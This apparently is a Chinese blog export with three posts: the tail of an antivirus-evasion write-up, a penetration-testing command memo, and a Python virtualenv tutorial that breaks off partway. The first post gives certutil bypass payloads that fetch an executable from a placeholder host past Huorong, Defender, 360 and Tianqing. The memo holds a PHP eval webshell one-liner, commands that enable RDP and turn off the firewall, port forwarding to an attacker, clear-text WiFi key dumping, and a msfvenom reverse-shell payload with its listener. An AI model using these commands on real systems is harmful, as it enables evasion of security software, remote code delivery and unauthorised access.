<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386116.png" alt="图片"></p>
<p>好家伙，尝试使用其他方式调用certutil还是不行，估计是不管其启动父进程，只要天擎识别到启动的是certutil并且带有urlcache参数就会拦截。</p>
<p>既然这样，那我们思路就有了，只要让天擎不识别到为certutil是不是就可以绕过了，首先想到的天擎可能是根据程序的哈希值进行识别的，那我们尝试改变certutil的hash试试，把calc.exe附加到certutil的后面，这样既改变了certutil的hash而且也不影响certutil的正常执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386117.png" alt="图片"></p>
<p>可以看到，从拦截信息来看还是把new识别为certutil，我们看一下new的版本信息也还是certutil的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386118.png" alt="图片"></p>
<p>所以推测杀软是根据程序版本信息进行识别的，我们尝试修改程序版本信息看看能否绕过。</p>
<p>为了验证这个思路，网上找了一圈没有发现系统自带的命令可以修改程序版本信息，无奈之下找到一个三方的小巧好用的修改工具verpatch，经过测试只需要修改程序版本信息中InternalName字段的值，这里我们InternalName修改为空看看情况。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verpatch.exe c.exe /s InternalName &quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>可以看到天擎已经不识别为certuitl了，正常的下载也不再拦截了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386119.png" alt="图片"></p>
<p>不过到这里我们已经借助了三方工具来修改程序元数据，所以此时的绕过意义已经不大了，只能说明这个绕过思路是可行的，在一些其他场景可以发挥作用。</p>
<h2 id="0X07-绕过操作的payload"><a href="#0X07-绕过操作的payload" class="headerlink" title="0X07   绕过操作的payload"></a>0X07   绕过操作的payload</h2><p>火绒绕过（随意发挥）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache  -split -f http://xxx.com/dns.execertutil -urlcache -split -gmt -f http://xxx.com/dns.execertutil -url&quot;&quot;cache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>



<p>Defender绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -url&quot;&quot;&quot;&quot;cache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>



<p>360绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil|certutil -urlcache split -f http://xxx.com/dns.execopy c:\windows\system32\certutil.exe c.exec -urlcache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>



<p>天擎绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy c:\windows\system32\certutil.exe c.exeverpatch.exe c.exe /s InternalName &quot;&quot;certutil -urlcache  -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>



<h2 id="0X08-测试结果"><a href="#0X08-测试结果" class="headerlink" title="0X08 测试结果"></a>0X08 测试结果</h2><p>测试时间：2022年5月24-26日</p>
<table>
<thead>
<tr>
<th>测试环境</th>
<th>杀软</th>
<th>版本</th>
<th>能否绕过</th>
</tr>
</thead>
<tbody><tr>
<td>win10 物理机</td>
<td>火绒</td>
<td>5.0.68.1</td>
<td>可以</td>
</tr>
<tr>
<td>win11 物理机</td>
<td>Windows Defender</td>
<td>4.18.2203.5-0</td>
<td>可以</td>
</tr>
<tr>
<td>win10 物理机</td>
<td>360安全卫士</td>
<td>13.0.0.2003</td>
<td>可以</td>
</tr>
<tr>
<td>win7 sp1 虚拟机</td>
<td>天擎</td>
<td>v10.3.0.2009</td>
<td>特定场景可以</td>
</tr>
</tbody></table>
<h2 id="0X09-后话"><a href="#0X09-后话" class="headerlink" title="0X09 后话"></a>0X09 后话</h2><p>在测试天擎后，询问团队里大佬有无姿势，大佬反手就是一发绕过命令，原理还是urlcache进行变形，因为不管怎么样杀软获取到实际参数还是要做正则匹配，那我们只要加一些既不影响命令原意又能打断正则匹配的符号就行了，大家往这个方向fuzz也可以达到目的。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>个人知识库备忘录</title>
    <url>/posts/fff24931.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>备忘录分为：技巧、命令、工具，三大类别。</p>
<p>旨在记录常用、好用的知识，便于快速翻阅查找，节省时间。</p>
<h2 id="技巧篇"><a href="#技巧篇" class="headerlink" title="技巧篇"></a>技巧篇</h2><h3 id="1-webshell-上传"><a href="#1-webshell-上传" class="headerlink" title="1.webshell 上传"></a>1.webshell 上传</h3><p>（1）Windows 命令行写入 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?^&gt;&gt; ./WWW/shell.php</span><br></pre></td></tr></table></figure>







<h2 id="操作系统篇"><a href="#操作系统篇" class="headerlink" title="操作系统篇"></a>操作系统篇</h2><h3 id="1-Windows"><a href="#1-Windows" class="headerlink" title="1. Windows"></a>1. Windows</h3><p>（1）查看并杀死某个进程</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">tskill pid</span><br><span class="line"></span><br><span class="line"><span class="built_in">taskkill</span> /f /im notepad.exe /t</span><br><span class="line"><span class="built_in">taskkill</span> /f /pid <span class="number">1234</span> /t</span><br></pre></td></tr></table></figure>

<p>(2) 查看本机网络连接情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano|findstr 本机ip</span><br><span class="line"></span><br><span class="line">-a 查看开启了哪些端口</span><br><span class="line">-n 查看端口的网络连接情况</span><br><span class="line">-o 查看端口的进程，方便杀死</span><br></pre></td></tr></table></figure>

<p>(3) RDP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开启 RDP</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /d 0 /t REG_DWORD /f</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !=&quot;&quot;) CALL SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">#查看 RDP 服务端口</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制</span><br><span class="line"></span><br><span class="line">#将十六进制转换为 10 进制</span><br><span class="line">set /a a=0xd3d</span><br></pre></td></tr></table></figure>



<p>(4) 防火墙</p>
<p><strong>netsh</strong></p>
<p>查看防火墙状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>

<p>开启防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode enable</span><br><span class="line">netsh firewall set allprofiles state on</span><br></pre></td></tr></table></figure>

<p>关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p>设置防火墙日志路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\Windows\firewall.log&quot;</span><br></pre></td></tr></table></figure>

<p>添加防火墙规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; dir=in action=allow protocol=tcp localport=3389           允许 3389 端口</span><br></pre></td></tr></table></figure>

<p>删除防火墙规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall delete rule name=&quot;rule_name&quot;</span><br></pre></td></tr></table></figure>

<p>添加端口规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall portopening tcp 1234 rule_name</span><br></pre></td></tr></table></figure>

<p>删除端口规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall delete portopening tcp 1234</span><br></pre></td></tr></table></figure>

<p>添加程序规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall add allowedprogram &quot;C:\\nc.exe&quot; &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure>

<p>删除程序规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall delete allowedprogram &quot;C:\\nc.exe&quot;</span><br></pre></td></tr></table></figure>

<p>添加端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 [listenaddress=victim_ip] listenport=victim_port connectaddress=attack_ip connectport=attack_port</span><br></pre></td></tr></table></figure>

<p>删除端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 [listenaddress=victim_ip] listenport=victim_port</span><br></pre></td></tr></table></figure>

<p>查看端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br><span class="line">netsh interface portproxy show v4tov4</span><br><span class="line">netsh interface portproxy show v4tov6</span><br><span class="line">netsh interface portproxy show v6tov4</span><br><span class="line">netsh interface portproxy show v6tov6</span><br></pre></td></tr></table></figure>

<p>安装 IPv6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>

<p>查看无线网络信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles</span><br></pre></td></tr></table></figure>

<p>查看指定 WIFI 密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles wifi_name key=clear</span><br></pre></td></tr></table></figure>

<p>(5) 改变字符编码，修复乱码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">chcp    查看命令行环境字符编码（为一个全局设置）</span><br><span class="line">    936 -- GBK(一般情况下为默认编码)</span><br><span class="line">    437 -- 美国英语</span><br><span class="line">    65001 -- utf-8</span><br><span class="line">    1200 -- utf-16</span><br><span class="line">    1201 -- utf-16(Big-Endian)</span><br><span class="line">    12000 -- utf-32</span><br><span class="line">    12001 -- utf-32(Big-Endian)</span><br></pre></td></tr></table></figure>

<p>(6) <code>,</code> 代替空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir,c:\</span><br><span class="line">相当于：dir c:\</span><br></pre></td></tr></table></figure>

<p>(7）查找具有某内容的 asp 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /n /s /i &quot;某某网站&quot; C:\*.asp</span><br></pre></td></tr></table></figure>

<p>(8) 查找C盘上的某个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a/b/s C:\test.png</span><br></pre></td></tr></table></figure>



<h3 id="2-Linux"><a href="#2-Linux" class="headerlink" title="2. Linux"></a>2. Linux</h3><p>查找某个文件：flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / | grep flag.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查找具有某内容的php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;某某网站&quot;</span><br></pre></td></tr></table></figure>



<h3 id="3-Kali"><a href="#3-Kali" class="headerlink" title="3. Kali"></a>3. Kali</h3><p>(1) 远程登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop ip</span><br></pre></td></tr></table></figure>



<h2 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h2><h3 id="1-msfvenom"><a href="#1-msfvenom" class="headerlink" title="1. msfvenom"></a>1. msfvenom</h3><p>（1）生成 http 反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f exe -o re.exe</span><br></pre></td></tr></table></figure>



<h3 id="2-msfconsole"><a href="#2-msfconsole" class="headerlink" title="2. msfconsole"></a>2. msfconsole</h3><p>(1) 监听 http reverse shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost ip</span><br><span class="line">set lport port</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<h3 id="3-github"><a href="#3-github" class="headerlink" title="3. github"></a>3. github</h3><p>3.1 常规操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;my commit&quot;</span><br><span class="line">git remote add origin git@github.com:ccc-f/fsafe.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>



<p>3.2 git fetch 和 git merge 合并远程和本地的更新(更加安全)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:xxx/xxx.git</span><br><span class="line">git fetch origin main:tmp</span><br><span class="line">git merge tmp</span><br><span class="line">git add .</span><br><span class="line">git commit -m &#x27;提交&#x27;</span><br><span class="line">git push -u origin main </span><br></pre></td></tr></table></figure>



<p>3.3 git pull 可以先切换到本地的另一个分支,拉取更新，然后再合并到本地分支，再提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:xxx/xxx.git</span><br><span class="line">git checkout dev</span><br><span class="line">git pull </span><br><span class="line">git checkout main </span><br><span class="line">git merge dev </span><br><span class="line">git push -u origin main </span><br></pre></td></tr></table></figure>



<h2 id="网站篇"><a href="#网站篇" class="headerlink" title="网站篇"></a>网站篇</h2><h2 id="个人武器库"><a href="#个人武器库" class="headerlink" title="个人武器库"></a>个人武器库</h2><h3 id="1-补充-Goby-Poc"><a href="#1-补充-Goby-Poc" class="headerlink" title="1. 补充 Goby Poc"></a>1. 补充 Goby Poc</h3><p>拓尔思_mas_rce</p>
<p><a href="http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20ERP-NC%20NCFindWeb%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html">用友 ERP-NC NCFindWeb 目录遍历漏洞</a></p>
<p>H3C_IMC_RCE</p>
<p><a href="https://www.freebuf.com/news/193509.html">SpringBoot Actuator 配置不当</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/iot/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80%20NVMS-1000%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2019-20085.html">TVT数码科技 NVMS-1000 路径遍历漏洞 CVE-2019-20085</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/webapp/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C%20VOS3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html">昆石网络 VOS3000虚拟运营支撑系统 %c0%ae%c0%ae 任意文件读取漏洞</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/webapp/%E6%9E%81%E9%80%9AEWEBS/%E6%9E%81%E9%80%9AEWEBS%20casmain.xgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html">极通EWEBS casmain.xgi 任意文件读取漏洞</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/webapp/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%20iAudit%E5%A0%A1%E5%9E%92%E6%9C%BA%20get_luser_by_sshport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/webapp/eGroupWare/eGroupWare%20spellchecker.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">eGroupWare spellchecker.php 远程命令执行漏洞</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/webapp/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20gui_detail_view.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html">齐治堡垒机 gui_detail_view.php 任意用户登录漏洞</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">华天动力OA 8000版 workFlowService SQL注入漏洞</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_ftp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html">万户OA</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2014%20get_contactlist.php%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html">通达</a></p>
<p><a href="http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422.html">致远</a></p>
<p><a href=""></a></p>
<p><a href=""></a></p>
<p><a href=""></a></p>
<p><a href=""></a></p>
<p><a href=""></a></p>
<h3 id="2-个人常用工具"><a href="#2-个人常用工具" class="headerlink" title="2. 个人常用工具"></a>2. 个人常用工具</h3><blockquote>
<p>推荐一个工具，可以自己去 DIY 集成下方工具，免去繁琐的查找打开工具过程</p>
<p><a href="https://github.com/ghealer/GUI_Tools">GUI_Tools</a></p>
<p>我自己也 DIY 了一个工具，目前在用这个：</p>
<p><a href="https://github.com/ccc-f/PenKitGui">PenKitGui</a></p>
</blockquote>
<p>(1) 渗透测试</p>
<p>BurpSuite</p>
<p>Awvs <a href="https://www.fahai.org/index.php/archives/24/comment-page-1#comments">https://www.fahai.org/index.php/archives/24/comment-page-1#comments</a></p>
<p>Goby</p>
<p><a href="https://github.com/j1anFen/shiro_attack">shiro反序列化利用</a></p>
<p><a href="https://github.com/Peony2022/shiro_killer">shiro批量检测</a></p>
<p>fofaviewer</p>
<p>(2) 内网渗透</p>
<p>Cobaltstrike</p>
<p>fscan</p>
<p>(3) 数据库利用</p>
<p>sqlmap</p>
<p><a href="https://github.com/SafeGroceryStore/MDAT">MDAT</a></p>
<p>(4) Web 扫描</p>
<p>dirsearch</p>
<p>御剑目录扫描</p>
<p>OneForAll</p>
<p>Packer-Fuzzer</p>
<p>JsFinder</p>
<p>(6) Webshell 管理</p>
<p>Godzila</p>
<p>冰蝎</p>
<p>(7) 搜索引擎</p>
<p>Fofa</p>
<p>Zoomeye</p>
<h3 id="3-burp-chrome拓展"><a href="#3-burp-chrome拓展" class="headerlink" title="3. burp+chrome拓展"></a>3. burp+chrome拓展</h3><p>重点是几个被动扫描插件，避免了繁琐的手工测试。</p>
<p><strong>burpsuite</strong></p>
<ol>
<li><p><strong>BurpFastJsonScan</strong> — BurpFastJsonScan,一款基于BurpSuite的被动式FastJson检测插件<a href="https://github.com/pmiaowu/BurpFastJsonScan">源处</a></p>
</li>
<li><p><strong>HaE</strong> — 一款使用Java开发的信息高亮标记与提取插件，比之前介绍过的两款（BurpSuite-Xkeys和IntelligentAnalysis-SSTVINFO）体验要好一点（需要手动写检测规则，内置只有一个邮箱的检测规则）。<a href="https://github.com/gh0stkey/HaE">源处</a></p>
</li>
<li><p><strong>BurpShiroPassiveScan</strong> —一款基于BurpSuite的被动式shiro检测插件，目前有两大功能1.shiro框架指纹检测 2.shiro加密key检测 <a href="https://github.com/pmiaowu/BurpShiroPassiveScan">源处</a> </p>
</li>
<li><p><strong>domain_hunter_pro</strong> —domain_hunter的高级版本，SRC挖洞、HW打点之必备 <a href="https://github.com/bit4woo/domain_hunter_pro">源处</a></p>
</li>
<li><p><strong>BurpSuite_403Bypasser</strong> —用python编写的用来测试绕过403的插件。<a href="https://github.com/sting8k/BurpSuite_403Bypasser">源处</a></p>
</li>
<li><p><strong>sqlmap4burp++.0.2.jar</strong> —多平台无需外部依赖的burp联动sqlmap插件，使用也很简单，导入在burp拦截的请求里或者重放都可以直接发送到sqlmap4burp界面，第一次需要选择sqlmap.py文件位置进行设置，详细的可以看<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus">飘雪表哥-c0ny1源处</a>。</p>
</li>
<li><p><strong>captcha-killer-modified</strong> — captcha-killer的修改版，主要用于验证码爆破，适配新版Burpsuite，支持 dddocr 调用 <a href="https://github.com/f0ng/captcha-killer-modified">源处</a></p>
</li>
<li><p><strong>passive-scan-client-0.1-jar-with-dependencies.jar</strong> — Burp被动扫描流量转发插件,比如搭配长亭的<a href="https://github.com/chaitin/xray"><code>XRAY</code></a>来进行被动扫描，借用群里表哥的话:<del>挂着坐收洞</del>。<a href="https://github.com/c0ny1/passive-scan-client/blob/master/README.md">详细说明</a></p>
</li>
<li><p><strong>chunked-coding-converter.0.2.1.jar</strong> 国人c0ny1最新版 burp分块输出，也是对抗waf的插件</p>
</li>
<li><p><strong>struts_ext_v2.jar</strong> —支持burpsuite插件形式调用检查struts2系列漏洞 <a href="https://raw.githubusercontent.com/Mr-xn/BurpSuite-collections/master/plugins/struts_ext_v2.jar">下载</a>-<a href="https://github.com/prakharathreya/Struts2-RCE">源处</a></p>
</li>
</ol>
<p><strong>chrome插件</strong></p>
<ol>
<li>检测web蜜罐 - <a href="https://github.com/cnrstar/anti-honeypot">anti-honeypot</a></li>
<li>油猴 - Tampermonkey</li>
<li>Adblock Plus - 免费的广告拦截器</li>
<li>Momentum - 标签页</li>
<li>Octotree - GitHub code tree</li>
<li>OneTab - 节省高达95％的内存，并减轻标签页混乱现象</li>
<li>Proxy SwitchyOmega - 轻松快捷地管理和切换多个代理设置。</li>
<li></li>
</ol>
<p><strong>firefox插件：</strong></p>
<p>Script Blocker Ultimate</p>
<p>阻止脚本执行</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>创建 Python 虚拟环境</title>
    <url>/posts/edf0e010.html</url>
    <content><![CDATA[<blockquote>
<p>Python 的虚拟环境是十分有必要的</p>
</blockquote>
<h1 id="使用virtualenv创建虚拟python环境"><a href="#使用virtualenv创建虚拟python环境" class="headerlink" title="使用virtualenv创建虚拟python环境"></a>使用virtualenv创建虚拟python环境</h1><h2 id="第一种安装"><a href="#第一种安装" class="headerlink" title="第一种安装"></a>第一种安装</h2><p>通过命令：</p>
<blockquote>
<p>优点：以后您将能够升级 virtualenv 而不会影响系统的其他部分。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-virtualenv</span><br></pre></td></tr></table></figure>

<p>或者 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install virtualenv</span><br></pre></td></tr></table></figure>

<p>然后创建一个虚拟环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">virtualenv env1</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/image-20210907125608863.png" alt="image-20210907125608863"></p>
<p>进入env1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd env1</span><br></pre></td></tr></table></figure>

<p>激活环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source bin/activate</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/image-20210907130001598.png" alt="image-20210907130001598"></p>
<p>你会发现在shell提示符前面多了(env1)这个提示，这就说明你已经是在虚拟环境中，在这个里面你可以安装任意的python库，而不用担心会把系统自带的python库搞乱。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">virtualenv -p /usr/bin/python3.5 myenv</span><br><span class="line">-p指定python版本</span><br></pre></td></tr></table></figure>

<p> 另外，如果存在多个python解释器，可以选择指定一个Python解释器（比如<code>python2.7</code>），没有指定则由系统默认的解释器来搭建。</p>
<p>如果不进入文件夹，则使用下面的命令激活：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source student-env/bin/activate</span><br></pre></td></tr></table></figure>

<p>  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/image-20210907161340231.png" alt="image-20210907161340231"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="D:\a1r\project\myblog\source\imgs\使用virtualenv创建虚拟python环境\image-20221202102032139.png" alt="image-20221202102032139"></p>
<p>停用虚拟环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="第二种安装"><a href="#第二种安装" class="headerlink" title="第二种安装"></a>第二种安装</h2><p>另外有一个工具，封装了创建虚拟环境的过程，不需要再使用source ［路径］来创建，只需使用一个命令，不需考虑路径。</p>
<p>这个额外的工具就是：<strong>virtualenvwrapper</strong>。</p>
<p>通过 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install virtualenvwrapper </span><br></pre></td></tr></table></figure>

<p>安装。</p>
<p>安装完成之后，需要在用户根目录下（即&#x2F;home&#x2F;[username]）的.bashrc末尾加入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure>

<p>有的人写是在.bash_profile文件中加入，不过我测试没有成功。</p>
<p>设置好之后，你就可以通过下面的命令来操作虚拟环境了：</p>
